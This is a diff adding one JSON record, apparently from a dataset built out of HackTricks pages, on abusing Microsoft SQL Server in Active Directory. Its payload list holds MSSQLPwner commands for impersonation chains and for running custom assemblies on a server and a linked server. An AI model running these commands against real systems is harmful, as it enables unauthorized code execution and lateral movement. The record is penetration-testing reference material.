@@ -1,0 +1,27 @@
+{
+  "id": "windows_hardening_703c02e9fe9e",
+  "category": "windows-hardening",
+  "title": "abusing ad mssql",
+  "description": "# MSSQL AD Abuse\n\n{{#include ../../banners/hacktricks-training.md}}\n\n\n## **MSSQL Enumeration / Discovery**\n\n### Python\n\nThe [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) tool is based on impacket, and allows also authenticate using kerberos tickets, and attack through link chains\n\n<figure><img src=\"https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png\"></figure>\n  \n```shell\n# Interactive mode\nmssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ",
+  "payloads": [
+    "# MSSQL AD Abuse",
+    "{{#include ../../banners/hacktricks-training.md}}",
+    "## **MSSQL Enumeration / Discovery**",
+    "### Python",
+    "The [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) tool is based on impacket, and allows also authenticate using kerberos tickets, and attack through link chains",
+    "<figure><img src=\"https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png\"></figure>",
+    "```shell",
+    "# Interactive mode",
+    "mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive",
+    "# Interactive mode with 2 depth level of impersonations",
+    "mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -max-impersonation-depth 2 interactive",
+    "# Executing custom assembly on the current server with windows authentication and executing hostname command",
+    "mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname",
+    "# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server",
+    "mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname"
+  ],
+  "source": "HackTricks",
+  "references": [
+    "/workspaces/hunter-skill/hacktricks/src/windows-hardening/active-directory-methodology/abusing-ad-mssql.md"
+  ]
+}
